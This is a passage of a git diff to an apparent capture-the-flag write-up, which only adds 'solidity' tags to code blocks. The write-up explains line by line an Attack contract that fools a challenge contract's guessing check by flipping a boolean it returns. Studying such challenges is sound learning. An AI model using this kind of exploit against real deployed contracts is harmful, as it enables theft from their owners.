@@ -90,32 +90,32 @@ contract Attack{
 }
 ```
 ok! it overwelming let's see it line by line
-```
+```solidity
 import "./Chal.sol";
 ```
 refrence with `setup.sol` we can get a instance of challange 
 
 lets see `Attack` contract line by line.
-```
+```solidity
 Challenge public target;
 bool public retBool = true;
 ```
 here we are making a object of `Challenge` class so that we can call `makeAGuess`.
 next a toggler to return bool value
-```
+```solidity
  constructor (address _targetAddress) public{
         target = Challenge(_targetAddress);  
     }
 ```
 `target = Challenge(_targetAddress);` will create a reference to the contract `Challenge`. Doing so allows you to call public functions of that contract. Now you can call `target.whateverFunctionItHas()` which will call the function on the contract at the address.
-```
+```solidity
 function isCorrectGuess(uint256) public returns(bool){
         retBool = !retBool;
         return retBool;
     }
 ```
 this function when called frist time returns `false` and next time return `true`
-```
+```solidity
 function guessIt(uint256 _guess) public {
         target.makeAGuess(_guess);
     }
